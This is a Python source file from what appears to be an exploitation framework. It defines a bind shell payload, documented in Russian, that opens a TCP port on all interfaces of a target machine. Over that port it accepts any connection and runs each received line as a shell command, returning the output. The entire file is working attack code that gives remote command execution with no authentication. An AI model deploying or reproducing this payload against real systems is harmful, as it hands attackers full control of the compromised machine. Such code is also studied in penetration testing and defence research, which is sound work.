# File: exploits/payloads/bind_shell.py

import socket
import subprocess
import threading
from typing import Optional

from exploits.payloads.payload_base import PayloadBase


class BindShellPayload(PayloadBase):
    """
    Payload для установки bind shell на целевой машине.

    Открывает на целевой машине TCP порт и ожидает подключения,
    позволяя атакующему выполнять команды.

    Класс наследует базовый интерфейс PayloadBase.
    """

    def __init__(self, target: str, port: int, bind_port: int):
        """
        Инициализация полезной нагрузки bind shell.

        :param target: адрес цели (используется для логики запуска)
        :param port: порт цели (не используется напрямую)
        :param bind_port: порт на целевой машине, на котором будет открыт bind shell
        """
        super().__init__(target, port)
        self.bind_port = bind_port
        self.sock: Optional[socket.socket] = None
        self.is_running = False

    def prepare(self) -> bool:
        """
        Подготовка payload, обычно не требует действий.

        :return: True — подготовка успешна
        """
        return True

    def _handle_client(self, conn: socket.socket):
        """
        Обрабатывает сессию bind shell, принимая команды и возвращая вывод.

        :param conn: клиентское соединение с атакующим
        """
        try:
            while True:
                conn.send(b"$ ")
                cmd = b""
                while not cmd.endswith(b"\n"):
                    chunk = conn.recv(1024)
                    if not chunk:
                        return
                    cmd += chunk
                command = cmd.decode().strip()
                if command.lower() == "exit":
                    break

                proc = subprocess.Popen(command, shell=True,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
                stdout, stderr = proc.communicate()
                conn.send(stdout + stderr)
        finally:
            conn.close()

    def execute(self) -> bool:
        """
        Запускает bind shell на целевой машине,
        открывая указанный порт и ожидая подключения атакующего.

        :return: True при успешном запуске
        """
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.bind(("0.0.0.0", self.bind_port))
            self.sock.listen(5)
            self.is_running = True

            # Обработка клиентов в отдельных потоках
            while self.is_running:
                conn, _ = self.sock.accept()
                client_thread = threading.Thread(target=self._handle_client, args=(conn,))
                client_thread.daemon = True
                client_thread.start()
            return True
        except Exception:
            return False

    def cleanup(self) -> None:
        """
        Останавливает bind shell и закрывает сокет.
        """
        self.is_running = False
